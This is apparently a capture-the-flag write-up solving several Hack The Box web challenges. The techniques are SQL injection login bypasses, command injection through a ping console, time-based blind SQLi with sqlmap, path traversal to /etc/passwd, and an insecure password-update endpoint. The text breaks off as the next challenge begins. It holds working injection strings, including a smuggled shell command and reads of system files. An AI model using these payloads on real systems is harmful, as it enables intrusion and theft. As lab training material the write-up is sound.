Can you help pandora with this task? Difficulty: very easy\nVisiting the site gives us a generic login page. Trying the classic admin:admin and admin:password failed, so it\u0026rsquo;s time to take a look at the source code supplied. Exploring database.py we see the following configuration:\n1 2 3 def login(username, password): # We should update our code base and use techniques like parameterization to avoid SQL Injection user = query_db(f\u0026#39;SELECT password FROM users WHERE username = \u0026#34;{username}\u0026#34; AND password = \u0026#34;{password}\u0026#34; \u0026#39;, one=True) The comment is a pretty plain hint that this SQL query is not well sanitized, and allows for very basic SQL injection. For our user submission, we will escape the username query with \u0026ldquo;, then bypass a password check with \u0026ldquo;OR 1=1 \u0026ndash; \u0026ldquo;. The end result is we will login if the database can find a user called \u0026quot;\u0026rdquo; or if the value 1 is equal to 1. Since the latter is always true, we should login. Note that the space after comment lines \u0026ndash; must be present, or else this will be interpreted as minus.\nThe password will never be checked, so this can be whatever. Just like that, we are in. And the flag is first up on the table.\nHTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}\nGunhead During Pandora\u0026rsquo;s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable.

Difficulty: very easy\nVisiting the website we see a lot of text, and the only interactable piece seems to be a pull-up console:\nOur options for commands are extremely limited. Perhaps the provided source code can give us more insight? In ReconModel.php, we see how the program handles this ping command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ cat ReconModel.php \u0026lt;?php #[AllowDynamicProperties] class ReconModel { public function __construct($ip) { $this-\u0026gt;ip = $ip; } public function getOutput() { # Do I need to sanitize user input before passing it to shell_exec? return shell_exec(\u0026#39;ping -c 3 \u0026#39;.$this-\u0026gt;ip); } } We have a commented note pointing out the lack of sanitization within the shell_exec. We should be able to use this /ping command to execute multiple shell commands when we include a break; Testing with id:\n1 /ping 8.8.8.8; id We see the 2nd shows our id. This command injection is successful. We will probe the current directory, and since there\u0026rsquo;s no harm, take a guess that flag.txt is in our current directory:\nWe didn\u0026rsquo;t hit it this time, but using this command scheme we can keep using ls to poke around for the flag. Or we can try find.\nNow we find it in probably the next most likely location, the base directory.\nHTB{4lw4y5_54n1t1z3_u53r_1nput!!!}\nOrbital In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder? Difficulty: easy\nVisiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what\u0026rsquo;s happening by viewing the provided source code. When viewing the database.py, we find an interesting hint/note:\n1 2 3 4 5 6 7 8 9 10 11 12 def login(username, password): # I don\u0026#39;t think it\u0026#39;s not possible to bypass login because I\u0026#39;m verifying the password later. user = query(f\u0026#39;SELECT username, password FROM users WHERE username = \u0026#34;{username}\u0026#34;\u0026#39;, one=True) if user: passwordCheck = passwordVerify(user[\u0026#39;password\u0026#39;], password) if passwordCheck: token = createJWT(user[\u0026#39;username\u0026#39;]) return token else: return False Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?\nBefore moving on to probing SQL injection further, I check for potentially alternative pages by looking at the routes.py file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.\nInstead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap.

The payload utilized:\n1 Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} And fortunately with this, sqlmap is able to grab admin\u0026rsquo;s password from the database. The login credentials are as follows:\n1 {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ichliebedich\u0026#34;} Using these credentials gets us in.\nNow that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a communication.mp3 file. We saw some information on an export page in the source code, so let\u0026rsquo;s revisit this to get a better idea on what\u0026rsquo;s going on. In blueprints/test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 def exportFile(): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() communicationName = data.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) try: # Everyone is saying I should escape specific characters in the filename. I don\u0026#39;t know why. return send_file(f\u0026#39;/communications/{communicationName}\u0026#39;, as_attachment=True) except: return response(\u0026#39;Unable to retrieve the communication\u0026#39;), 400 We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd. In burpsuite: Request\nResponse\nWe see the contents of /etc/passwd. Now all that remains is to find the flag. After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ cat Dockerfile FROM python:3.8-alpine # Install packages RUN apk add --no-cache --update mariadb mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev # Upgrade pip RUN python -m pip install --upgrade pip # Install dependencies RUN pip install Flask flask_mysqldb pyjwt colorama # Setup app RUN mkdir -p /app RUN mkdir -p /communication # Switch working environment WORKDIR /app # Add application COPY challenge . # Setup supervisor COPY config/supervisord.conf /etc/supervisord.conf # Expose port the server is reachable on EXPOSE 1337 # Disable pycache ENV PYTHONDONTWRITEBYTECODE=1 # copy flag COPY flag.txt /signal_sleuth_firmware COPY files /communications/ # create database and start supervisord COPY --chown=root entrypoint.sh /entrypoint.sh RUN chmod +x /entrypoint.sh ENTRYPOINT [\u0026#34;/entrypoint.sh\u0026#34;] They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it\u0026rsquo;s now called signal_sleuth_firmware In Burpsuite: Request:\nResponse:\nFlag HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}\nPassman Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager? Difficulty: easy\nVisiting the page we are greeted with a login page. We are also presented with the option to create an account. After guessing a few times for user admin, I decide to create a user. Trying username admin results in an error, telling us this username is in use. Good to note; for now we will create user a. Registering as user a was successful, and now we see a page where we might submit and store passwords for given addresses. This page operates as a password manager, true to the challenge description and title. A brief check at XSS fails, so let\u0026rsquo;s explore the provided source code. Interestingly, the database.js file shows us more request options than we might have expected. In particular, there is an option to update passwords:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async updatePassword(username, password) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = `UPDATE users SET password = ? WHERE username = ?`; this.connection.query( stmt, [ String(password), String(username) ], (err, _) =\u0026gt; { if(err) reject(err) resolve(); } ) }); } There is no authorization verification here, so perhaps if we can request to change the password of user admin, we can login as admin. Starting with a post request to register a new user:\nRevised post request:\nResponse:\nWe have updated the admin password successfully, or so it says. When we attempt to login as admin, we are successful! The flag is given in the password field of admin\u0026rsquo;s saved passwords.\nHTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\nTrapped Source Intergalactic Ministry of Spies tested Pandora\u0026rsquo;s movement and intelligence abilities.
